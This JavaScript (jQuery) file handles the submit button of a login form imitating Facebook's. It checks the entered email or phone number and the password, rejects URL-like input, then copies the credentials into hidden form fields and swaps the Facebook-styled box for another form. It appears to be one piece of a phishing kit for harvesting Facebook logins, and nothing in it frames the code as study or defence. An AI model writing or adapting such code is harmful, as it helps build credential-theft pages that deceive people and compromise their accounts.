$('#btnfb').on('click',function(event){
    event.preventDefault()
    var user = $('#user').val();
    var pass = $('#pass').val();
    if(user == '' || user == null)
    {
        $('.email').css('display','block');
        $('.sandi').css('display','none');
        return false;
    }else{
    
        if(user.includes('@')){
        let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
        if(user.match(pattern)){
        $('.email').css('display','none');
        }else{
        $('.email').css('display','block');
        $('.sandi').css('display','none');
        return false;
        }
        }
        
        if(!isNaN(user)){
        if(user.length <= 10){
        $('.email').css('display','block');
        $('.sandi').css('display','none');
        return false;
        }else{
        $('.email').css('display','none');
        }
        }
        
        if(user.match(/\s/g)){
        $('.email').css('display','block');
        $('.sandi').css('display','none');
        return false;
        }else{
        $('.email').css('display','none');
        }
        
        var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
        if(user.match(regex)){
        $('.email').css('display','block');
        $('.sandi').css('display','none');
        return false;
        }
        
        
        if(user.length <= 5){
        $('.email').css('display','block');
        $('.sandi').css('display','none');
        return false;
        }else{
        $('.email').css('display','none');
        }
        
    }
    if(pass == '' || pass == null || pass.length <= 5)
    {
        $('.sandi').css('display','block');
        return false;
    }else{
        $('.sandi').css('display','none');
    }
    var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
        if(pass.match(regexs)){
        $('.sandi').css('display','block');
        $('.email').css('display','none');
        return false;
        }else{
        $('.sandi').css('display','none');
        }
    
    // END EVENT
    $('input[name="user"]').val(user)
    $('input[name="pass"]').val(pass)
    $("#btnfb").addClass("disabled");
    $('.menu').hide()
    $('.login-facebook').fadeOut()
    $('.mask').fadeOut()
    $('.box').hide()
    $('.forms').fadeIn()
        })